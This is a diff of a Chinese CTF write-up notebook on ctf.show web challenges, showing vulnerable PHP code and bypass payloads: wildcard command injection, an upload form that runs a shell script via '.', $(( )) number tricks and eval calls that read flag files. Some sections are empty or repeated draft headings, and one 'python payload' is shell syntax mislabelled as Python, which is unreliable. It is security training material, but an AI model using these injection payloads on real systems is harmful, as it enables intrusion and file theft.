@@ -6544,7 +6544,7 @@ if(isset($_GET['c'])){
 
 > ?c=/bin/?at${IFS}f???????
 
-### ctf\_show web55*
+### ctf\_show web55 
 
 ~~~php
  <?php
@@ -6572,27 +6572,291 @@ if(isset($_GET['c'])){
 
 ~~~
 
+[参考P神博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
 
+> 利用 `.` 符号执行sh脚本文件
+>
+> 利用思路：
+>
+> post方法去上传一个sh脚本文件，这个sh文件里的内容就是我们的exp；并且这个sh文件被post方法上传后被暂时放到了/tmp/目录下，文件名为/tmp/phpXXXXXX ；所以get方法的参数C就是匹配刚才上传的sh文件并执行其中的payload;
 
+现在先构造一个post上传文件的html代码：
 
+~~~html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST数据包POC</title>
+</head>
+<body>
+<form action="http://9ab3bbbc-78df-40a1-99c1-1f353dd1c4b1.challenge.ctf.show/" method="post" enctype="multipart/form-data">
+<!--链接是当前打开的题目链接-->
+    <label for="file">文件名：</label>
+    <input type="file" name="file" id="file"><br>
+    <input type="submit" name="submit" value="提交">
+</form>
+</body>
+</html>
 
+~~~
 
+**抓包利用：**![image-20220817122515628](CTF刷题WriteUp.assets/image-20220817122515628.png)
+
+**获得flag**
+
+![image-20220817122605180](CTF刷题WriteUp.assets/image-20220817122605180.png)
 
 ### ctf\_show web56
 
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+> 没有过滤 `/` `?` `[` ``]``  `@` 所以做题方法与上一关一致
+
+![image-20220817123351645](CTF刷题WriteUp.assets/image-20220817123351645.png)
+
+
+
 ### ctf\_show web57
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-08 01:02:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+// 还能炫的动吗？
+//flag in 36.php
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
+        system("cat ".$c.".php");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> 使用\$(())构造数字
+>
+
+```
+${_}=""
+$((${_}))=0
+$((~$((${_}))))=-1
+然后拼接出-36在进行取反
+```
+
+注意的是：`${_}会输出上一次的执行结果`
+
+![image-20220817125316262](CTF刷题WriteUp.assets/image-20220817125316262.png)
+
+![image-20220817125359085](CTF刷题WriteUp.assets/image-20220817125359085.png)
+
+**python payload:**
+
+~~~python
+data=$((~$(())))*37
+data = ~$((data))
+data = $((data))
+print(data)
+~~~
+
+![image-20220817125858995](CTF刷题WriteUp.assets/image-20220817125858995.png)
+
+
 
 ### ctf\_show web58
 
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+**payload:**
+
+![image-20220817130839035](CTF刷题WriteUp.assets/image-20220817130839035.png)
+
+
+
+![image-20220817131033111](CTF刷题WriteUp.assets/image-20220817131033111-16607130430411.png)
+
+
+
+
+
 ### ctf\_show web59
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> payload:
+>
+> c=show_source(“flag.php”);
 
 ### ctf\_show web60
 
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+
+~~~
+
+> 代码和上一关一样，跳过
+
 ### ctf\_show web61
+
+> 代码和上一关一样，跳过
 
 ### ctf\_show web62
 
-### 
+> 代码和上一关一样，跳过
+
+### ctf\_show web63
+
+> 代码和上一关一样，跳过
+
+### ctf\_show web64
+> 代码和上一关一样，跳过
+
+### ctf\_show web65
+> 代码和上一关一样，跳过
+
+### ctf\_show web66
+
+> payload：
+>
+> c=print_r(scandir("/"));
+
+![image-20220817132447916](CTF刷题WriteUp.assets/image-20220817132447916.png)
+
+> c=highlight_file("/flag.txt");
+
+![image-20220817132638583](CTF刷题WriteUp.assets/image-20220817132638583.png)
+
+### ctf\_show web67
+
+> c=var_dump(scandir("/"));
+>
+> c=highlight_file("/flag.txt");
+
+
+
+### ctf\_show web68、、、、、
+
+> c=include("/flag.txt");
+
+ctf\_show web69
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+ctf\_show web70
+
+
+
+
 
 
 
@@ -7127,7 +7391,7 @@ if(isset($_GET['n']) && in_array($_GET['n'], $allow)){ //*** in_array()函数有
 
 ![image-20220816150238336](CTF刷题WriteUp.assets/image-20220816150238336.png)
 
-### ctf\_show web100
+### ctf\_show web100 。。。。。
 
 ~~~php
 <?php
@@ -7167,3 +7431,39 @@ if($v0){  //确保为真
 > ?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
 
 ![image-20220816152559524](CTF刷题WriteUp.assets/image-20220816152559524.png)
+
+
+
+
+
+### ctf\_show web151
+
+> 修改前端字段即可
+
+![image-20220817134347580](CTF刷题WriteUp.assets/image-20220817134347580.png)
+
+### ctf\_show web152
+
+> 修改前端 和 content-type字段
+
+![image-20220817134636020](CTF刷题WriteUp.assets/image-20220817134636020.png)
+
+### ctf\_show web153
+
+### ctf\_show web154
+
+
+
+
+
+ctf\_show web153
+
+
+
+ctf\_show web153
+
+ctf\_show web153
+
+ctf\_show web153
+
+ctf\_show web153
